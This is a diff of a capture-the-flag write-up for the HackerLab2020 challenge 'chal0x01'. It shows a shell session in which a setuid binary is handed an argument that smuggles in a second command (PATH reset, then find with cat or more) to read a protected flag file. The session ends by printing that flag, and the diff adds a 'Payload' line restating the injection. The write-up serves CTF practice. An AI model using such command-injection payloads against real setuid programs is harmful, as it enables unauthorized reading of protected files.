@@ -37,13 +37,15 @@ total 28K
 -rwsr-sr-x 1 chal0x01_pwn chal0x01_pwn 17K août  18 12:06 chal0x01
 -r--r----- 1 chal0x01_pwn chal0x01     470 août  18 12:06 chal0x01.c
 -r-------- 1 chal0x01_pwn chal0x01     253 août  18 11:06 f_l_a_g_
-chal0x01@vps-dc68098a:~$ ./chal0x01 inspiv 'PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&&cat `find /home/chal0x01 -type f -size 253c`'
+chal0x01@vps-dc68098a:~$ ./chal0x01 inspiv 'PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&&more `find /home/chal0x01 -type f -size 253c`'
 Félicitations. Si tu as pu lire ce fichier, c'est que tu remplis les conditions necessaires pour participer à la phase finale du HackerLab2020.
 Il s'agit pour toi maintenant de t'entrainer plus que jamais!
 Voici le flag final!
 CTF_Kephren_1s_Th3_g0@t
 chal0x01@vps-dc68098a:~$
 ```
+
+Payload: ```./chal0x01 inspiv 'PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&&more `find /home/chal0x01 -type f -size 253c`'```
 
 ```
 FLAG: CTF_Kephren_1s_Th3_g0@t
